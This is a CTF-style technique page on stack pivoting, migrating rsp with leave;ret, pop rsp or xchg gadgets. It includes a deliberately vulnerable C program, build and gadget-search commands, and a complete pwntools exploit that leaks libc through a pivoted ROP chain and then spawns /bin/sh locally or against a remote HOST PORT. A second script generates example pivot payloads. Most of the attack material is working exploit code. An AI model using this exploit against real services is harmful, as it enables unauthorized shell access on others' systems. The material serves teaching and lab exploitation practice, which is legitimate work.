---
title: "Stack Pivoting - Migrating rsp Into a Stack You Own"
category: pwn
subcategory: pivot
type: technique
tags: [stack-pivot, pivot, leave-ret, pop-rsp, xchg-rsp, stack-migration, rop, fake-stack, bss, rbp, short-overflow, nx, pie, aslr, read, gets, pwntools, ropgadget, ropper, gef]
difficulty: medium
summary: "The overflow is too short for a chain. Move rsp into .bss or into the buffer itself with leave;ret, pop rsp or xchg rsp, then run the real chain there."
when_to_use:
  - "You control the saved rbp and the return address and little or nothing beyond them"
  - "The chain you need is 200+ bytes but the overflow only gives you 16-32"
  - "You can write a large blob to a fixed address (a global buffer, .bss, .data) but cannot overflow into it"
  - "A ret2csu or SROP payload does not fit in the space you have on the real stack"
  - "You need to run a chain twice, or return into a chain after a function that resets the stack"
tools: [pwntools, ROPgadget, ropper, checksec, gdb, gef, pwndbg, objdump]
related: [rop-fundamentals, rop-ret2libc, rop-ret2csu, rop-srop, rop-static-binary, rop-got-overwrite, stack-buffer-overflow-basics, mitigation-modern-playbook, rop-gadgets-cheatsheet, pwntools-cheatsheet]
---

## TL;DR

A ROP chain lives wherever `rsp` points. If the overflow gives you only two or three qwords past
the saved return address, you cannot fit a chain there -- but you can fit a *pivot*: one gadget
that reassigns `rsp` to memory you fully control. After the pivot, `ret` starts walking your fake
stack and the length limit disappears. `leave ; ret` is the workhorse, because the saved `rbp` you
already overwrote is its input.

## Recognise it

- The overflow is bounded: `read(0, buf, sizeof(buf) + 16)`, or `fgets(buf, 88, stdin)`, or a
  `strcpy` from a short field.
- You control exactly the saved `rbp` and the saved `rip`, and maybe one slot after.
- There is a large global buffer at a fixed address (No PIE) that the program fills earlier:
  a name field, a note buffer, `.bss`.
- `ROPgadget --binary ./vuln | grep -E "leave ; ret|pop rsp|xchg .*rsp|add rsp"` returns hits.
- The chain you actually need (ret2csu, SROP, a dlresolve setup) is far longer than the space.
- The program calls the vulnerable function in a loop, so you can write twice.

## Vulnerable source

```c
/* vuln.c - a global you can fill, and an overflow too short to use directly */
#include <stdio.h>
#include <unistd.h>

char name[0x200];                 /* fixed address in .bss, No PIE */

void vuln(void) {
    char buf[64];
    puts("name:");
    read(0, name, 0x200);         /* 512 controlled bytes at a known address */
    puts("say something:");
    read(0, buf, 88);             /* 64 pad + 8 saved rbp + 8 saved rip + 8 spare */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

```sh
# No PIE so `name` sits at a fixed address; NX on so we must ROP, not jump to shellcode
gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c

# the i386 twin, where `leave ; ret` is spelled the same and esp/ebp are 4 bytes
gcc -m32 -fno-stack-protector -no-pie -z noexecstack -o vuln32 vuln.c

checksec --file=./vuln
ROPgadget --binary ./vuln | grep -E "leave ; ret|pop rsp ; ret|xchg .*rsp|add rsp, 0x"
readelf -S ./vuln | grep -E "\.bss|\.data"
```

## Theory

### What `leave ; ret` actually is

`leave` is exactly two operations:

```
leave   ==   mov rsp, rbp
             pop rbp
```

So a `leave ; ret` gadget is a three-step state machine driven entirely by `rbp`:

```
rsp  <- rbp          ; rsp is now wherever you pointed rbp
rbp  <- [rsp]        ; one qword consumed as the new rbp
rsp  <- rsp + 8
rip  <- [rsp]        ; the ret: your chain's first gadget
rsp  <- rsp + 8
```

### The rbp = target - 8 arithmetic

Overflowing a normal frame with `[padding][FAKE_RBP][leave_ret_gadget]` runs *two* `leave ; ret`
sequences. The function's own epilogue runs first: it loads `rbp = FAKE_RBP` and returns into your
gadget. Then the gadget runs, and that is the one that moves `rsp`.

After the gadget, `rip` is taken from `[FAKE_RBP + 8]`, because `pop rbp` ate `[FAKE_RBP]` first.
So there are two equivalent conventions, and mixing them is the single most common way to lose an
hour:

| Convention | Fake stack contents at `T` | Set `FAKE_RBP` to |
|---|---|---|
| Leading dummy | `p64(0) + rop.chain()` | `T` |
| No dummy | `rop.chain()` | `T - 8` |

pwntools' `rop.migrate(addr)` uses the second: it emits `pop rbp ; ret` with `addr - 8`, then a
`leave ; ret`, and expects your chain to start exactly at `addr`.

On i386 the same holds with 4-byte slots: `ebp = T` and a leading `p32(0)`, or `ebp = T - 4`.

### The pivot gadget catalogue

| Gadget | Effect | When you use it |
|---|---|---|
| `leave ; ret` | `rsp = rbp ; rbp = [rsp] ; ret` | You control the saved `rbp`. Always present. |
| `pop rbp ; ret` then `leave ; ret` | Set `rbp` explicitly, then pivot | You do *not* control saved `rbp`, but have chain room |
| `pop rsp ; ret` | `rsp` comes straight from the next payload slot | Cleanest pivot; rarer |
| `xchg rax, rsp ; ret` | Swap, so a value you built in `rax` becomes the stack | After a function returns a useful pointer in `rax` |
| `xchg eax, esp` (`0x94`) | One-byte i386 pivot, often with a `ret` right after | i386, tight space, partial overwrites |
| `add rsp, 0x38 ; ret` | Skip forward over junk | Jump past a canary, or over a `read` buffer's tail |
| `sub rsp, 0x40 ; ret` | Skip backwards | Re-run a chain you already sent |
| `mov rsp, rbp ; ret` | `leave` without the `pop` | Convention above shifts by 8 |
| `mov esp, [ebp-0x??] ; ...` | Compiler leftovers | Rare, read the disassembly carefully |

Search for all of them at once:

```sh
# every pivot-shaped gadget, with how far each one moves rsp
ROPgadget --binary ./vuln | grep -E "leave ; ret|(pop|mov|xchg|add|sub) .*(rsp|esp)"

# ropper has a dedicated mode that ranks pivots by displacement
ropper --file ./vuln --stack-pivot
```

### Where to pivot to

The fake stack must be **writable, mapped, and at an address you know**. In order of preference:

1. A global buffer the program already filled with your data (`name` above) -- No PIE means it is
   at a fixed address, and you already wrote your chain there.
2. `.bss` plus an offset, after a ROP `read(0, bss, 0x200)` in stage one. Add `0x100`-`0x400` of
   slack so the chain does not collide with live globals like `stdout`'s buffer.
3. The overflowed buffer itself, if you leaked a stack address. This is how you pivot when there
   is no writable global at all: the chain sits in `buf`, and `FAKE_RBP = leaked_buf_addr`.
4. The environment or a heap chunk whose address you leaked.

Leave headroom *below* the pivot target too. Any function you call from the migrated chain pushes
a frame downward from the new `rsp`. Pivoting to the very last bytes of `.bss` makes `system()`
scribble off the end of the segment.

### The short-overflow two-stage

The canonical shape when nothing is pre-filled for you:

```
stage 1 (on the real stack, must fit in the overflow):
    [padding][FAKE_RBP = BSS][pop rdi ; ret][0][pop rsi ; ret][BSS][read@plt or syscall]
    ... too long. So instead:
    [padding][FAKE_RBP = BSS][pop rdi;ret][0] ... still too long.

stage 1 that actually fits in 24 bytes past the buffer:
    [padding][FAKE_RBP = BSS - 8][addr of the read() call site inside vuln]
```

Returning into the *middle of the vulnerable function* re-runs its `read(0, buf, N)` with the same
small bound, but the function epilogue will now `leave ; ret` using your `FAKE_RBP`. You get a
second write and a pivot for the price of three qwords. When you have slightly more room, the
cleaner version is `[padding][FAKE_RBP][pop rdi;ret][0][... read ...][leave ; ret]`.

## Attack

1. Measure the overflow: how many bytes past the saved return address do you actually control?
2. Find `leave ; ret` (and `pop rbp ; ret` if you cannot set the saved `rbp` directly).
3. Choose the pivot target and confirm it is writable in `vmmap` (gef/pwndbg).
4. Get your full chain into that target: an earlier input, or a stage-one `read()`.
5. Build stage one as `padding || FAKE_RBP || leave_ret`.
6. Pick a convention for the `-8` and stick to it. Print `rop.dump()` and the fake stack hexdump.
7. Break on the `leave ; ret` in gdb, single-step twice, and check `$rsp` landed where you meant.

## Exploit

```python
#!/usr/bin/env python3
"""
Stack pivot: chain lives in a fixed .bss global, the short overflow only pivots.

Local:   ./exploit.py
Remote:  ./exploit.py HOST PORT
Build:   gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
LIBC = "/lib/x86_64-linux-gnu/libc.so.6"

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

OFFSET = 64  # 64 byte buffer, saved rbp at +64, saved rip at +72


def start():
    """Local process by default, remote when argv gives host/port."""
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+70\nc\n")
    return process(BINARY)


def leak_chain(rop):
    """The chain that runs AFTER the pivot: leak puts@got, then return to main."""
    rop.call("puts", [elf.got["puts"]])
    rop.call(elf.symbols["main"])
    return rop


def main():
    name_addr = elf.symbols["name"]
    leave_ret = ROP(elf).find_gadget(["leave", "ret"]).address
    log.success("name    = %#x", name_addr)
    log.success("leave;ret = %#x", leave_ret)

    io = start()

    # ---- round 1: leak libc through the pivoted chain -----------------------
    rop = leak_chain(ROP(elf))
    # Leading-dummy convention: rbp = name_addr, chain starts at name_addr + 8.
    fake_stack = p64(0xDEADBEEF) + rop.chain()
    log.info("pivoted chain:\n%s", rop.dump())

    io.recvuntil(b"name:")
    io.send(fake_stack.ljust(0x200, b"\x00"))

    io.recvuntil(b"say something:")
    io.send(flat({OFFSET: [name_addr, leave_ret]}, filler=b"A"))

    leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    libc = ELF(LIBC, checksec=False)
    libc.address = leak - libc.symbols["puts"]
    log.success("puts   = %#x", leak)
    log.success("libc   = %#x", libc.address)

    # ---- round 2: pivot again, this time into system("/bin/sh") -------------
    rop2 = ROP([elf, libc])
    rop2.raw(rop2.ret.address)                       # movaps alignment
    rop2.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])

    io.recvuntil(b"name:")
    io.send((p64(0xDEADBEEF) + rop2.chain()).ljust(0x200, b"\x00"))

    io.recvuntil(b"say something:")
    io.send(flat({OFFSET: [name_addr, leave_ret]}, filler=b"A"))

    io.interactive()


if __name__ == "__main__":
    main()
```

The pwntools helper and the hand-built equivalents, side by side:

```python
#!/usr/bin/env python3
"""Four ways to move rsp, and what rop.migrate() emits under the hood."""
from pwn import *

context.arch = "amd64"

BSS = 0x404800          # pivot target: writable, fixed, with headroom
LEAVE_RET = 0x40117C    # leave ; ret
POP_RBP = 0x401180      # pop rbp ; ret
POP_RSP = 0x401182      # pop rsp ; ret
XCHG_RAX_RSP = 0x401190  # xchg rax, rsp ; ret
ADD_RSP_38 = 0x401195   # add rsp, 0x38 ; ret


def pivot_leave_ret(target):
    """Saved rbp is ours: one gadget. Chain must start at target + 8."""
    return flat(target, LEAVE_RET)


def pivot_pop_rbp_leave(target):
    """Saved rbp is NOT ours (canary, or rbp reloaded). Two gadgets, no dummy."""
    return flat(POP_RBP, target - 8, LEAVE_RET)


def pivot_pop_rsp(target):
    """Cleanest: rsp comes straight out of the payload. Chain starts at target."""
    return flat(POP_RSP, target)


def pivot_xchg_rax(_target):
    """rax already holds the new stack (e.g. the return value of a read/malloc)."""
    return flat(XCHG_RAX_RSP)


def pivot_add_rsp(_target):
    """Not a migration: just skip 0x38 bytes of junk further down the same stack."""
    return flat(ADD_RSP_38)


def main():
    for name, fn in [
        ("leave;ret", pivot_leave_ret),
        ("pop rbp + leave;ret", pivot_pop_rbp_leave),
        ("pop rsp;ret", pivot_pop_rsp),
        ("xchg rax,rsp;ret", pivot_xchg_rax),
        ("add rsp,0x38;ret", pivot_add_rsp),
    ]:
        blob = fn(BSS)
        log.info("%-22s %2d bytes  %s", name, len(blob), enhex(blob))

    # What pwntools does for you, given a real ELF:
    #     rop = ROP(elf)
    #     rop.call('read', [0, BSS, 0x200])
    #     rop.migrate(BSS)          # pop rbp ; BSS-8 ; leave ; ret
    #     payload = flat({offset: rop.chain()})
    log.info("rop.migrate(addr) == pop rbp ; (addr - 8) ; leave ; ret")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **The off-by-8.** If your chain's first gadget never executes but the second one does, you used
  the wrong convention. `pop rbp` inside `leave` ate one qword. Add a dummy or subtract 8.
- **Pivoting into a buffer that `read()` is still filling.** If you pivot to the same address a
  later `read()` targets, the read overwrites your chain mid-execution. Offset them.
- **No headroom.** `system()` pushes a frame and `do_system` uses several hundred bytes below
  `rsp`. Pivot to `bss + 0x400`, not `bss + 0x8`.
- **`rbp` is needed after the pivot.** Chains that call functions which reference local variables
  through `rbp` will fault. Set a sane `rbp` with `pop rbp ; ret` right after the pivot if a
  called function crashes on `[rbp-0x8]`.
- **PIE.** With PIE there is no fixed `.bss`. Leak the binary base first, set `elf.address`, and
  pwntools rebases `elf.symbols['name']` and every gadget for you.
- **The canary sits between the buffer and the saved rbp.** A pivot does not bypass a canary:
  you still need the canary value in place. See `mitigation-canary-bypass`.
- **`leave ; ret` in the epilogue is free.** You do not need a separate gadget if the function's
  own `leave ; ret` is the last thing standing between you and the pivot -- overwrite saved `rbp`
  and let the return address point directly at your chain's first gadget. The double-`leave`
  pattern is only needed when you want `rsp` moved *and* a chain executed.
- **`xchg` pivots clobber the source register.** After `xchg rax, rsp`, `rax` holds the *old*
  stack pointer. That is sometimes a free stack leak.
- **i386 sizes.** Everything above is 4 bytes wide; `leave ; ret` is the same opcode pair, and
  `xchg eax, esp` is the one-byte `0x94`, which makes it reachable through partial overwrites.
- **Double pivot.** Migrating twice (real stack -> `.bss` -> a second `.bss` region) is normal
  when the first region is too small; just chain another `leave ; ret`.
- **`add rsp, N ; ret` is not a migration.** It moves within the same stack. Use it to hop over
  junk, not to escape a length limit.

## Tools

| Tool | Use |
|---|---|
| `ROPgadget --binary ./vuln \| grep "leave ; ret"` | The one gadget you almost always need |
| `ropper --file ./vuln --stack-pivot` | Ranked list of pivots by how far they move `rsp` |
| `pwntools rop.migrate(addr)` | Emits `pop rbp ; addr-8 ; leave ; ret` automatically |
| `rop.find_gadget(["leave", "ret"])` | Gadget object; `.address` is the qword |
| `vmmap` in gef / pwndbg | Confirm the pivot target is writable and how much room follows |
| `checksec --file=./vuln` | No PIE means `.bss` is fixed and pivot targets are free |
| `readelf -S ./vuln` | Exact `.bss` / `.data` addresses and sizes |
| `gdb`: `b *LEAVE_RET`, `si`, `si`, `p $rsp` | The only reliable way to verify the landing |
